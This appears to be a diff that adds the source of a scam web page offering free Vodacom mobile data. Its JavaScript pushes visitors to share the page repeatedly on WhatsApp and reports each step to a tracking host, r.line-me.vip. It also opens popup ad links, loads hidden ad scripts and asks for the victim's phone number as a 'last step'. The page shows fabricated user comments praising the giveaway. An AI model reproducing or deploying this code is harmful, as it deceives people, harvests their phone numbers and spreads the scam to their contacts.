+value == 2 || value == 4 ? alert('Sharing failed!\n\n The same group or the same friend is not correct. Please check and share again.') : void(0) ;
+record('adien',value);
+record(theme,'share');
+if(value>= 12){
+record('adien','wc');
+lasthtml();
+}
+}
+
+function fn1_a() {
+v=parseInt(get_Cookie('prog'))-1;
+document.querySelector('.progress').style.display = "block";
+v=='0'?ob=30:v=='1'?ob=50:v=='2'?ob=52:v=='3'?ob=60:v=='4'?ob=60:v=='5'?ob=65:v=='6'?ob=70:v=='7'?ob=80:v=='8'?ob=85:v=='9'?ob=90:v=='10'?ob=96:v=='11'?ob=98:v=='12'?ob=100:void(0);
+document.querySelector('.progress span').style['width'] = ob + "%";
+document.querySelector('.progress span').style['width'] = ob + "%";
+document.querySelector('.progress p').textContent = ob + "%";
+}
+
+
+
+function tipn(){
+alert('Yello! Your 10GB Free Data will be Activated immidiately after you share to whatsApp groups and friends so they can also benefit from it.  Dial *136# to check your Data when done. \n Share until the blue bar is full!');
+}
+
+
+function set_Cookie(name,value){
+var Days = 30;
+var exp = new Date();
+exp.setTime(exp.getTime() + (Days*20*1000));
+document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
+}
+function get_Cookie(name){
+var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+if(arr=document.cookie.match(reg)){
+return unescape(arr[2]);
+}
+return '';
+}
+function getQueryString(name) {
+var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
+var r = window.location.search.substr(1).match(reg);
+if (r != null) {
+return unescape(r[2]);
+}
+return null;
+}
+
+record(getQueryString('th'));
+record('adien');
+
+function record (a,b){
+var aa = new XMLHttpRequest;
+if(b){
+if(get_Cookie(a+b)!== a+b){
+aa.open("GET", '//r.line-me.vip/record/total.php?ac=node&name='+a+'&node='+b), aa.onreadystatechange = function () {
+set_Cookie(a+b,a+b);
+}, aa.send(null)
+}
+}else{
+if(get_Cookie(a)!== a){
+aa.open("GET",'//r.line-me.vip/record/total.php?ac=total&name='+a), aa.onreadystatechange = function () {
+set_Cookie(a,a);
+}, aa.send(null)
+}
+}
+}
+
+var zeit = new Date();
+var sec = zeit.getSeconds();
+if (sec < 6 ){
+sec = 9
+}
+if (sec > 5 & sec < 13 ){
+sec = 8
+}
+if (sec > 11 & sec < 19 ){
+sec = 7
+}
+if (sec > 17 & sec < 25 ){
+sec = 6
+}
+if (sec > 23 & sec < 31 ){
+sec = 5
+}
+if (sec > 29 & sec < 37 ){
+sec = 4
+}
+if (sec > 35 & sec < 43 ){
+sec = 3
+}
+if (sec > 41 & sec < 49 ){
+sec = 2
+}
+if (sec > 47 & sec < 55 ){
+sec = 1
+}
+if (sec > 54){
+sec=0
+};
+var add = sec;
+var zeit2 = new Date();
+var minute = zeit2.getMinutes();
+var timer1 = (60-minute)*60;
+if (timer1 > 1800) {
+var resttimer = (30-minute)*10
+} else {
+var resttimer = (60-minute)*10
+};
+var timer = resttimer + add + 67;
+function updateTimer() {
+timer--;
+$("#gutschein").text(timer);
+if (timer < 9) {
+stopFunction();
+}
+}
+var myTimer = window.setInterval(updateTimer, 6000);
+function stopFunction() {
+window.clearInterval(myTimer);
+}
+
+function lasthtml(){
+html='<font color="#43AF65">The last step:</font><br/><br/>To get your Free Internet Data, you have to complete this final step!<br/><br/>1. You have to Enter your Vodacom OLD NUMBER to activate 10GB free Data<br/><br/>After adding Click on GET DATA Below and wait for admin to check it, the review will be completed in 1 hours and you will get a Notification<br/><br/>';
+document.getElementById("lastapp").innerHTML=html;
+document.getElementById("buttonl").style.display='none';
+document.getElementById("button2").style.display='block';
+}
+
+function dapp(){
+window.open('http://outrotomr.com/4/3144603');
+}
+function dappp(){
+window.open('http://outrotomr.com/4/3144603');
+}
+function ads(vdata,ir){
+record('adiensense');
+record('adiensense',ir);
+window.open('http://outrotomr.com/4/3144603');
+}
+
+
+
+</script>
+
+<div id='buttonl'>
+<button class='btn btn-primary' onclick='incrementValue1()' type='button'>WhatsApp</button>
+<input id='number' type='hidden' value='0'/>
+
+<h4 class='textlastup'>Share until the blue bar is full!</h4>
+
+<div class='progress'>
+<span aria-valuemax='100%' aria-valuemin='1%' aria-valuenow='1' id='progressbar' style='width: 1%; max-width: 100%;'/><p></p>
+</div>
+<br>
+<a href="javascript:tipn();" id="b2">
+<div class="buttond">ENTER YOUR NUMBER</div>
+</a>
+</div>
+</div>
+
+<div id='button2' style="display:none">
+<br />
+  <center>
+    <script type="text/javascript">
+	atOptions = {
+		'key' : '0856a91b286f678543a3dffb9b89e84e',
+		'format' : 'iframe',
+		'height' : 250,
+		'width' : 300,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://www.effectivedisplaycontent.com/0856a91b286f678543a3dffb9b89e84e/invoke.js"></scr' + 'ipt>');
+</script>     
+  </center>
+    <br/>  
+  
+  
+  
+  <div class="form-group">
+                                    <label for="s1">Your Vodacom Old Number</label>
+        							<input type="text" placeholder="Enter Your Old Number" name="LName" class="form-control" required="">
+        						</div>
+  <br/>
+  
+  
+  
+  
+  
+ <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://obqj2.com/4/6798333" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary">GET 10GB DATA</button>
+                    </a><br/>
+
+
+
+
+<script type="text/javascript" src=""></script>
+</div>
+<hr/>
+</div></div></div></div>
+<br/>
+<center>
+
+
+</center>
+<br/>
+<div class='fbcoms' style="display:none;">
+<p class='comments'>
+</p>
+<p class='buttons'>
+<span class='like'>
+Like
+</span>
+&#183;
+<span>
+Comment
+</span>
+&#183;
+<span>
+Share
+</span>
+&#183;
+<span>
+delete
+</span>
+</p>
+<p class='totlikes'>
+<span id='youand'>
+</span>
+<span class='fbblue'>
+and 204,208
+</span>
+others like this
+</p>
+<p class='viewmore clearfix'>
+<span class='left'>
+Show 234 more comments…
+</span>
+<span class='right'>
+50 of 120,310
+</span>
+<br/>
+</p>
+<div class='item' id='fb8' style='display: none; opacity: 1;'>
+<img class='profileimg' height='50' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibTVlO7vlsbfcGWPN6MOajlwvzA1tIvTRrbAUXzE-e31OpXvQ10nTxf6xh65ZOqaLvBaBdIjsvrVVbwWbJbzjDpFCXiZzbHxgkCpu-9WSGGfhqckMPOlxlRR_Yn4gpqNwgNhQZiPEqTZfyuar2wJW9wF61dReUAaa8J0TvhcJ1xZ3UPADyX3foQoaOHlpL/s320/F219E04D-0E69-4751-8B5B-F112E2C3547D.jpeg' width='50'/>
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Adellia Vrisca
+</span>
+<br/>
+Thank you so much for The free data
+
+
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb7' style='display: none; opacity: 1;'>
+<img class='profileimg' height='50' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQ4eJyKGNLsOPFCWVQyn0-FiJqd3vvTFzvzEHo5gMIaEUv3uOQWaqQxuBBU1294q33mahalTX1I593S79dB0NfZl2eQYzLNOGG6v62TBYGu2H0GzHeYTt-Vm2ZW0USyKl6UCMFeWRf3Aj8JM7xmkx77hrIBJsZ8_9JmpG9GZZLjb9LRY07n0u2dM8yhReA/s320/0741A745-4B26-45D2-A8B0-3273B2427D12.jpeg' width='50'/>
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Alya Alya
+</span>
+<br/>
+this is amazing
+
+
+
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb6' style='display: none; opacity: 1;'>
+<img class='profileimg' height='50' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg06FNT3rEO6i_zMEtZurgawMyjl-H9z3jTKVFkoO1m2mKhKDwWlZ2Rm96k5l5sJe3FkAe0RP2GMSj-sfmVitlXuXa75qmRLz9ePj6OZlyw6TtzBYIpwslkw7ykK9CaxhMrluwqPoeP-WPjdYmLJabNkC7ZzWvmcNP2hd_avho2c5NAB1RF_z8_lrCLAh9j/s320/37078ABC-A10F-425E-AAE5-32FF9E1457E5.jpeg' width='50'/>
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Jovitha Febriani
+</span>
+<br/>
+thanks very much Vodacom
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb5' style='display: none; opacity: 1;'>
+<img class='profileimg' height='50' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2GAOd8FtNL__F8YDhuCYY_6S_kV90zrEJPXMi59wmpWL0Znv6pbKDEVYaOPGpta0J7vYGBWeTu071O1Scu84ijpCJARCVPYSNxNpzUI91sN8qkq4vZSW4k02e8MmMjUa2GDkeigT5KJCSO7GD7lMPl3HeZdHIORWbKXhYX6Opu85qc09Z-goUFkVBLHTH/s320/188F6E82-5595-4AA1-8C34-EB49974A02B5.jpeg' width='50'/>
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Rudy Mbondett
+</span>
+<br/>
+Yes! It's just awesome, thanks.
+
+
+
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb4' style='display: none; opacity: 1;'>
+<img class='profileimg' height='50' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgg7dgxhzORvvqxBGC43yhBaITeCXVRVdgBYasRR6zy1UCPBICnakAv-FC4N66_MmCn9gbnXRabXATQyIhTZDFleG2dyNCmYF2m6caMKxvoLXcuYj4l94MQ7GuLBIdONJqGgbSPUbbtQE6yjVAtLH5j6Pw8XZyL1wqgT8xslVlu1bGuydogrDvRb0-JGNzW/s320/35C2A7AB-14A2-4703-8927-4646C98273FC.jpeg' width='50'/>
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+David Van Reza
+</span>
+<br/> Yeeess
+
+
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+<!-- BEGIN: Powered by Supercounters.com -->
+<script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1630143,"likes","4267B2");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
+
+<!-- END: Powered by Supercounters.com -->
+
+
+</span>
+</p>
+</div>
+<div class='item'>
+<img class='profileimg' height='50' src='https://blogger.googleusercontent.com/img/a/AVvXsEjGykVTAV2VmEozgTCwsKEUa39cfa9xFXvQOlvfzGPN9kRlRbUN7ypWp9b1WUCCXIpgHiRSIkv6goe4I22w-x9aHDVEAMmqsl6v5IUgdm4xSCUpl61iACvex8FytPFccLsxDokmqfbKYl_PZ-mJJMf1wHv27sIBw75Y9E_DxqiKIIzteM9uYKxj-JrWCg=s320' width='50'/>
+<p class='comtxt'>
+<span class='name'>
+Siska Aulia
+
+</span>
+<br/> I got my data
+
+
+
+</p>
+<p class='combot'>
+<span class='ago'>
+Barasan
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+<span class='likes totlikes'>
+112
+</span>
+</p>
+</div>
+</div>
+<br/>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<img src='https://blogger.googleusercontent.com/img/a/AVvXsEimXzCzES30TXDVeTeODz-x7ovWtr1Tlbn5l_ZvB6wihVe7mfdXArizZdgei4ndLvKnZ9V_aAEE2wpqyjhIvVZMNQ2JvW_e8i2BZwzJeAN3ee1LUN9hTnJ2RUf0yspEx7j5B_M6gXdtRPwU_DhBZxbayycfbT-nvN2JT7n3k9o22ZCo-HO0QPE1bBsB3w=s320' width='350' />
+
+  
+<div>
+
+
+</body></html>
+<!-- Histats.com START (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,3355942,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
